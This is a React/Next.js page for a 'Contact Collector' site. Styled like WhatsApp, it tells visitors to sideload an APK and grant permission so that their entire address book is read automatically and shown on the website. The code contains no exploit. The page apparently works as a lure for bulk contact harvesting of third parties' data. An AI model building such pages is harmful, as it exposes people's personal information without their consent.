'use client';

import React, { useState, useEffect, useCallback } from 'react';
import {
  Phone,
  Download,
  Users,
  ChevronRight,
  Clock,
  Smartphone,
  ArrowRight,
  Trash2,
  ExternalLink,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';

// ─── Types ───────────────────────────────────────────────

interface SessionInfo {
  id: string;
  count: number;
  createdAt: string;
}

// ─── Color Utilities ────────────────────────────────────

const AVATAR_COLORS = [
  'bg-emerald-600', 'bg-teal-600', 'bg-cyan-600', 'bg-green-700',
  'bg-lime-700', 'bg-emerald-700', 'bg-teal-700', 'bg-cyan-700',
];

function getAvatarColor(name: string): string {
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = name.charCodeAt(i) + ((hash << 5) - hash);
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length];
}

function getInitials(name: string): string {
  const parts = name.trim().split(/\s+/);
  if (parts.length >= 2) return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
  return name.slice(0, 2).toUpperCase();
}

function timeAgo(dateStr: string): string {
  const now = new Date();
  const date = new Date(dateStr);
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  const diffHours = Math.floor(diffMs / 3600000);
  const diffDays = Math.floor(diffMs / 86400000);

  if (diffMins < 1) return 'Just now';
  if (diffMins < 60) return `${diffMins}m ago`;
  if (diffHours < 24) return `${diffHours}h ago`;
  if (diffDays < 7) return `${diffDays}d ago`;
  return date.toLocaleDateString();
}

// ─── Main App Component ─────────────────────────────────

export default function ContactCollectorHome() {
  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [downloading, setDownloading] = useState(false);

  // Load sessions from localStorage
  useEffect(() => {
    try {
      const stored = localStorage.getItem('contact_sessions');
      if (stored) {
        setSessions(JSON.parse(stored));
      }
    } catch {}
  }, []);

  // Save sessions to localStorage
  const saveSessions = useCallback((newSessions: SessionInfo[]) => {
    setSessions(newSessions);
    try {
      localStorage.setItem('contact_sessions', JSON.stringify(newSessions));
    } catch {}
  }, []);

  // Delete a session from history
  const deleteSession = useCallback((id: string) => {
    const updated = sessions.filter(s => s.id !== id);
    saveSessions(updated);
  }, [sessions, saveSessions]);

  // Download APK
  const handleDownloadApp = useCallback(async () => {
    setDownloading(true);
    try {
      // Try to download the APK from the public directory
      const link = document.createElement('a');
      link.href = '/contact-collector.apk';
      link.download = 'contact-collector.apk';
      link.click();
    } catch {
      alert('Download failed. Please try again.');
    }
    setTimeout(() => setDownloading(false), 3000);
  }, []);

  // ═══════════════════════════════════════════════════════
  //  RENDER
  // ═══════════════════════════════════════════════════════

  return (
    <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
      {/* ─── Header ──────────────────────────────────── */}
      <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md z-10">
        <div className="w-9 h-9 rounded-full bg-white/20 flex items-center justify-center">
          <Users className="w-5 h-5 text-white" />
        </div>
        <div className="flex-1 min-w-0">
          <h1 className="text-white font-bold text-lg">Contact Collector</h1>
          <p className="text-white/60 text-xs">Collect &amp; view contacts in vCard</p>
        </div>
      </div>

      {/* ─── Hero Section ────────────────────────────── */}
      <div className="bg-gradient-to-b from-[#075E54] to-[#054D44] px-6 pt-6 pb-10">
        <div className="text-center mb-6">
          <div className="w-24 h-24 rounded-full bg-white/10 flex items-center justify-center mx-auto mb-5 shadow-lg">
            <div className="w-16 h-16 rounded-full bg-[#25D366] flex items-center justify-center">
              <Phone className="w-8 h-8 text-white" />
            </div>
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Contact Collector</h2>
          <p className="text-white/60 text-sm max-w-xs mx-auto">
            Download the app → Install → Allow permission → All contacts appear here automatically
          </p>
        </div>

        {/* Download App Button */}
        <Button
          onClick={handleDownloadApp}
          disabled={downloading}
          className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-bold h-16 rounded-2xl text-lg shadow-lg active:scale-[0.98] transition-transform"
        >
          <Download className="w-6 h-6 mr-3" />
          {downloading ? 'Downloading...' : 'Download App'}
        </Button>

        <p className="text-white/40 text-center text-xs mt-3 leading-relaxed">
          Install the app on your Android phone, open it, and allow contact permission. <br/>
          All your contacts will automatically appear on this website.
        </p>
      </div>

      {/* ─── How it Works ────────────────────────────── */}
      <div className="px-4 py-5 bg-white mx-3 -mt-4 rounded-2xl shadow-sm mb-4">
        <h3 className="text-[#075E54] font-bold text-sm mb-4 flex items-center gap-2">
          <Smartphone className="w-4 h-4" />
          How it works
        </h3>
        <div className="space-y-3">
          {[
            { step: '1', title: 'Download App', desc: 'Click the green Download button above' },
            { step: '2', title: 'Install & Open', desc: 'Install the APK on your Android phone and open it' },
            { step: '3', title: 'Allow Permission', desc: 'Just tap Allow — all contacts auto-read, no selection needed' },
            { step: '4', title: 'View on Website', desc: 'Contacts appear here in vCard format — View, Copy, Download' },
          ].map((item) => (
            <div key={item.step} className="flex items-start gap-3">
              <div className="w-7 h-7 rounded-full bg-[#25D366] flex items-center justify-center shrink-0 mt-0.5">
                <span className="text-white font-bold text-xs">{item.step}</span>
              </div>
              <div>
                <p className="text-sm font-semibold text-gray-900">{item.title}</p>
                <p className="text-xs text-gray-500">{item.desc}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* ─── Contact History Section ─────────────────── */}
      <div className="px-3 pb-4">
        <div className="flex items-center justify-between mb-3 px-1">
          <h3 className="text-[#075E54] font-bold text-sm flex items-center gap-2">
            <Clock className="w-4 h-4" />
            My Contact History
          </h3>
          {sessions.length > 0 && (
            <Badge className="bg-[#25D366] text-white border-0 text-xs px-2 py-0.5">
              {sessions.length} session{sessions.length > 1 ? 's' : ''}
            </Badge>
          )}
        </div>

        {sessions.length === 0 ? (
          <div className="bg-white rounded-2xl shadow-sm p-8 text-center">
            <div className="w-16 h-16 rounded-full bg-gray-100 flex items-center justify-center mx-auto mb-4">
              <Users className="w-8 h-8 text-gray-300" />
            </div>
            <p className="text-gray-500 text-sm font-medium mb-1">No contacts yet</p>
            <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
              Download the app and allow contact permission — your contacts will appear here
            </p>
          </div>
        ) : (
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
            {sessions.map((session, index) => (
              <React.Fragment key={session.id}>
                <a
                  href={`/view/${session.id}`}
                  className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
                >
                  <Avatar className="w-11 h-11 shrink-0">
                    <AvatarFallback className="bg-[#25D366] text-white font-bold text-sm">
                      {session.count}
                    </AvatarFallback>
                  </Avatar>
                  <div className="flex-1 min-w-0 text-left">
                    <h4 className="text-sm font-semibold text-gray-900">
                      {session.count} Contact{session.count > 1 ? 's' : ''}
                    </h4>
                    <p className="text-xs text-gray-500 flex items-center gap-1">
                      <Clock className="w-3 h-3" />
                      {timeAgo(session.createdAt)}
                    </p>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={(e) => { e.preventDefault(); deleteSession(session.id); }}
                      className="w-8 h-8 rounded-full hover:bg-red-50 flex items-center justify-center transition-colors"
                      title="Remove from history"
                    >
                      <Trash2 className="w-4 h-4 text-gray-400" />
                    </button>
                    <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                  </div>
                </a>
                {index < sessions.length - 1 && (
                  <div className="ml-[68px] border-b border-gray-100" />
                )}
              </React.Fragment>
            ))}
          </div>
        )}
      </div>

      {/* ─── Footer ──────────────────────────────────── */}
      <div className="mt-auto px-4 py-3 bg-white border-t border-gray-100">
        <p className="text-center text-xs text-gray-400">
          Contact Collector &bull; vCard 3.0 &bull; Android Only
        </p>
      </div>
    </div>
  );
}
